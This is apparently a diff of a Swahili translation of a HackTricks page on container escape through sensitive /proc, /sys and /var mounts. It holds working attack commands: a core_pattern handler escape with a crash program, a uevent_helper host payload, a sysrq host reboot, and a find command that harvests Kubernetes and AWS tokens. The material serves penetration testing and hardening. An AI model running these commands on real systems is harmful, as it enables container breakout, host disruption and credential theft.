@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-Ufunuo wa `/proc`, `/sys`, na `/var` bila kutengwa kwa namespace sahihi kunaingiza hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufunuo wa taarifa. Hizi directories zina faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.
+Ufunuo wa `/proc`, `/sys`, na `/var` bila kutengwa kwa namespace kunaleta hatari kubwa za usalama, ikiwa ni pamoja na kuongezeka kwa uso wa shambulio na ufunuo wa taarifa. Maktaba haya yana faili nyeti ambazo, ikiwa zimepangwa vibaya au kufikiwa na mtumiaji asiyeidhinishwa, zinaweza kusababisha kutoroka kwa kontena, mabadiliko ya mwenyeji, au kutoa taarifa zinazosaidia mashambulizi zaidi. Kwa mfano, kuunganisha vibaya `-v /proc:/host/proc` kunaweza kupita ulinzi wa AppArmor kutokana na asili yake ya msingi wa njia, na kuacha `/host/proc` bila ulinzi.
 
 **Unaweza kupata maelezo zaidi ya kila hatari inayoweza kutokea katika** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)**.**
 
@@ -10,59 +10,71 @@ Ufunuo wa `/proc`, `/sys`, na `/var` bila kutengwa kwa namespace sahihi kunaingi
 
 ### `/proc/sys`
 
-Hii directory inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia `sysctl(2)`, na ina subdirectories kadhaa za wasiwasi:
+Maktaba hii inaruhusu ufikiaji wa kubadilisha vigezo vya kernel, kawaida kupitia `sysctl(2)`, na ina subdirectories kadhaa za wasiwasi:
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Imeelezwa katika [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Inaruhusu kufafanua programu ya kutekeleza wakati wa uzalishaji wa core-file na bytes 128 za kwanza kama hoja. Hii inaweza kusababisha utekelezaji wa msimbo ikiwa faili inaanza na bomba `|`.
-- **Mfano wa Upimaji na Ukatili**:
+- Ikiwa unaweza kuandika ndani ya faili hii inawezekana kuandika bomba `|` ikifuatiwa na njia ya programu au skripti ambayo itatekelezwa baada ya ajali kutokea.
+- Mshambuliaji anaweza kupata njia ndani ya mwenyeji kwa kontena lake akitekeleza `mount` na kuandika njia ya binary ndani ya mfumo wa faili wa kontena lake. Kisha, angamiza programu ili kufanya kernel itekeleze binary nje ya kontena.
 
+- **Mfano wa Upimaji na Ukatili**:
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Jaribu ufikiaji wa kuandika
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Weka handler maalum
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
 sleep 5 && ./crash & # Trigger handler
 ```
+Angalia [hii posti](https://pwning.systems/posts/escaping-containers-for-fun/) kwa maelezo zaidi.
 
+Mfano wa programu inayoshindwa:
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
-- Imeelezwa kwa undani katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Ina njia ya mzigo wa moduli ya kernel, inayotumika kwa kupakia moduli za kernel.
-- **Mfano wa Kuangalia Ufikiaji**:
+- Imeelezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Inashikilia njia ya mzigo wa moduli ya kernel, inayoitwa kwa ajili ya kupakia moduli za kernel.
+- **Mfano wa Kuangalia Upatikanaji**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Angalia ufikiaji wa modprobe
+ls -l $(cat /proc/sys/kernel/modprobe) # Angalia upatikanaji wa modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- Imeelezwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
-- Bendera ya kimataifa inayodhibiti ikiwa kernel inapaswa kujiweka katika hali ya panic au kuanzisha OOM killer wakati hali ya OOM inatokea.
+- Imejumuishwa katika [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Bendera ya kimataifa inayodhibiti ikiwa kernel itakumbwa na hofu au kuanzisha OOM killer wakati hali ya OOM inapotokea.
 
 #### **`/proc/sys/fs`**
 
 - Kulingana na [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html), ina chaguzi na taarifa kuhusu mfumo wa faili.
-- Ufikiaji wa kuandika unaweza kuwezesha mashambulizi mbalimbali ya kukatiza huduma dhidi ya mwenyeji.
+- Upatikanaji wa kuandika unaweza kuwezesha mashambulizi mbalimbali ya kukatiza huduma dhidi ya mwenyeji.
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- Inaruhusu kujiandikisha kwa waandishi wa tafsiri kwa muundo wa binary usio wa asili kulingana na nambari zao za uchawi.
-- Inaweza kusababisha kupanda kwa haki au ufikiaji wa root shell ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
-- Ukatili na maelezo yanayohusiana:
-- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
-- Mafunzo ya kina: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
+- Inaruhusu kujiandikisha kwa wakalimani wa fomati za binary zisizo za asili kulingana na nambari yao ya uchawi.
+- Inaweza kusababisha kupanda kwa haki au upatikanaji wa shell ya mzizi ikiwa `/proc/sys/fs/binfmt_misc/register` inaweza kuandikwa.
+- Ukatili unaohusiana na maelezo:
+- [Poor man's rootkit kupitia binfmt_misc](https://github.com/toffan/binfmt_misc)
+- Mafunzo ya kina: [Kiungo cha video](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
 ### Wengine katika `/proc`
 
 #### **`/proc/config.gz`**
 
 - Inaweza kufichua usanidi wa kernel ikiwa `CONFIG_IKCONFIG_PROC` imewezeshwa.
-- Inatumika kwa washambuliaji kubaini udhaifu katika kernel inayotumika.
+- Inafaida kwa washambuliaji kubaini udhaifu katika kernel inayotumika.
 
 #### **`/proc/sysrq-trigger`**
 
-- Inaruhusu kuanzisha amri za Sysrq, ambazo zinaweza kusababisha upya wa mfumo mara moja au hatua nyingine muhimu.
+- Inaruhusu kuanzisha amri za Sysrq, ambayo inaweza kusababisha upya wa mfumo mara moja au vitendo vingine vya dharura.
 - **Mfano wa Kuanzisha Upya Mwenyeji**:
 
 ```bash
@@ -71,8 +83,8 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 
 #### **`/proc/kmsg`**
 
-- Inafichua ujumbe wa buffer wa ring wa kernel.
-- Inaweza kusaidia katika mashambulizi ya kernel, uvujaji wa anwani, na kutoa taarifa nyeti za mfumo.
+- Inafichua ujumbe wa buffer ya ring ya kernel.
+- Inaweza kusaidia katika mashambulizi ya kernel, kuvuja anwani, na kutoa taarifa nyeti za mfumo.
 
 #### **`/proc/kallsyms`**
 
@@ -83,14 +95,14 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 
 #### **`/proc/[pid]/mem`**
 
-- Inafanya kazi na kifaa cha kumbukumbu ya kernel `/dev/mem`.
+- Inashirikiana na kifaa cha kumbukumbu ya kernel `/dev/mem`.
 - Kihistoria ilikuwa na udhaifu wa mashambulizi ya kupanda kwa haki.
-- Zaidi juu ya [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
+- Zaidi kuhusu [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
 
 - Inawakilisha kumbukumbu ya kimwili ya mfumo katika muundo wa ELF core.
-- Kusoma kunaweza kufichua maudhui ya kumbukumbu ya mfumo wa mwenyeji na kontena nyingine.
+- Kusoma kunaweza kuvuja maudhui ya kumbukumbu ya mfumo wa mwenyeji na kontena zingine.
 - Ukubwa mkubwa wa faili unaweza kusababisha matatizo ya kusoma au kuanguka kwa programu.
 - Matumizi ya kina katika [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
@@ -102,31 +114,31 @@ echo b > /proc/sysrq-trigger # Inarejesha mwenyeji
 #### **`/proc/mem`**
 
 - Kiolesura mbadala kwa `/dev/mem`, kinawakilisha kumbukumbu ya kimwili.
-- Inaruhusu kusoma na kuandika, mabadiliko ya kumbukumbu yote yanahitaji kutatua anwani za virtual hadi za kimwili.
+- Inaruhusu kusoma na kuandika, kubadilisha kumbukumbu yote kunahitaji kutatua anwani za virtual hadi za kimwili.
 
 #### **`/proc/sched_debug`**
 
-- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa namespace ya PID.
-- Inafichua majina ya mchakato, IDs, na vitambulisho vya cgroup.
+- Inarudisha taarifa za kupanga mchakato, ikipita ulinzi wa PID namespace.
+- Inafichua majina ya michakato, IDs, na vitambulisho vya cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Inatoa taarifa kuhusu maeneo ya kuunganisha katika namespace ya kuunganisha ya mchakato.
+- Inatoa taarifa kuhusu maeneo ya kupandisha katika namespace ya kupandisha ya mchakato.
 - Inafichua eneo la `rootfs` ya kontena au picha.
 
-### `/sys` Vulnerabilities
+### Udhihirisho wa `/sys`
 
 #### **`/sys/kernel/uevent_helper`**
 
 - Inatumika kwa kushughulikia `uevents` za kifaa cha kernel.
-- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo na mipaka wakati wa kuanzisha `uevent`.
+- Kuandika kwenye `/sys/kernel/uevent_helper` kunaweza kutekeleza skripti zisizo za kawaida wakati wa kuanzisha `uevent`.
 - **Mfano wa Ukatili**: %%%bash
 
 #### Inaunda payload
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
-#### Inapata njia ya mwenyeji kutoka kwa OverlayFS mount kwa kontena
+#### Inapata njia ya mwenyeji kutoka OverlayFS mount kwa kontena
 
 host*path=$(sed -n 's/.*\perdir=(\[^,]\_).\*/\1/p' /etc/mtab)
 
@@ -148,28 +160,28 @@ cat /output %%%
 
 #### **`/sys/kernel/vmcoreinfo`**
 
-- Inafichua anwani za kernel, ambayo inaweza kuhatarisha KASLR.
+- Inavuja anwani za kernel, ambayo inaweza kuhatarisha KASLR.
 
 #### **`/sys/kernel/security`**
 
-- Ina nyumba ya kiolesura cha `securityfs`, kinachoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
-- Ufikiaji unaweza kuwezesha kontena kuzima mfumo wake wa MAC.
+- Inashikilia kiolesura cha `securityfs`, kinachoruhusu usanidi wa Moduli za Usalama za Linux kama AppArmor.
+- Upatikanaji unaweza kuwezesha kontena kuzima mfumo wake wa MAC.
 
 #### **`/sys/firmware/efi/vars` na `/sys/firmware/efi/efivars`**
 
 - Inafichua violesura vya kuingiliana na mabadiliko ya EFI katika NVRAM.
-- Mipangilio isiyo sahihi au ukatili inaweza kusababisha kompyuta zisizoweza kuanzishwa au kuharibiwa.
+- Usanidi mbaya au ukatili unaweza kusababisha kompyuta za mkononi zisizoweza kuanzishwa au mashine za mwenyeji zisizoweza kuanzishwa.
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` inatoa kiolesura cha "hakuna sheria" kwa ufuatiliaji wa kernel.
-- Historia ya matatizo ya usalama kutokana na asili yake isiyo na mipaka.
+- `debugfs` inatoa kiolesura cha ufuatiliaji "bila sheria" kwa kernel.
+- Historia ya masuala ya usalama kutokana na asili yake isiyo na mipaka.
 
-### `/var` Vulnerabilities
+### Udhihirisho wa `/var`
 
-Folda ya mwenyeji **/var** ina sockets za wakati wa kontena na mifumo ya faili ya kontena.
-Ikiwa folda hii imeunganishwa ndani ya kontena, kontena hiyo itapata ufikiaji wa kuandika na kusoma kwenye mifumo ya faili ya kontena nyingine
-ikiwa na haki za root. Hii inaweza kutumika vibaya kuhamasisha kati ya kontena, kusababisha kukatizwa kwa huduma, au kuingiza nyuma kontena nyingine na programu zinazotumika ndani yao.
+Folda ya mwenyeji ya **/var** ina soketi za wakati wa kontena na mifumo ya faili ya kontena.
+Ikiwa folda hii imepandishwa ndani ya kontena, kontena hiyo itapata upatikanaji wa kusoma-kandika kwa mifumo ya faili ya kontena zingine
+ikiwa na haki za mzizi. Hii inaweza kutumika vibaya kuhamasisha kati ya kontena, kusababisha kukatizwa kwa huduma, au kuingiza nyuma kontena nyingine na programu zinazotumika ndani yao.
 
 #### Kubernetes
 
@@ -224,9 +236,9 @@ Kumbuka kwamba kontena HALIHITAJI kuanzishwa upya au chochote. Mabadiliko yoyote
 
 Unaweza pia kubadilisha faili za usanidi, binaries, huduma, faili za programu, na profaili za shell ili kufikia RCE ya kiotomatiki (au ya nusu-kiotomatiki).
 
-##### Ufikiaji wa akidi za wingu
+##### Ufikiaji wa hati za wingu
 
-Kontena linaweza kusoma tokeni za K8s serviceaccount au tokeni za AWS webidentity ambazo zinamruhusu kontena kupata ufikiaji usioidhinishwa kwa K8s au wingu:
+Kontena linaweza kusoma tokens za K8s serviceaccount au tokens za AWS webidentity ambazo zinamruhusu kontena kupata ufikiaji usioidhinishwa kwa K8s au wingu:
 ```bash
 / # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 /host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
@@ -237,8 +249,8 @@ Kontena linaweza kusoma tokeni za K8s serviceaccount au tokeni za AWS webidentit
 ```
 #### Docker
 
-Ukatili katika Docker (au katika matumizi ya Docker Compose) ni sawa kabisa, isipokuwa kwamba kawaida
-faili za mifumo ya faili ya kontena nyingine zinapatikana chini ya njia tofauti:
+Ushirikiano katika Docker (au katika matumizi ya Docker Compose) ni sawa kabisa, isipokuwa kwamba kawaida
+faili za mifumo ya faili ya kontena nyingine zinapatikana chini ya njia tofauti ya msingi:
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Storage Driver: overlay2
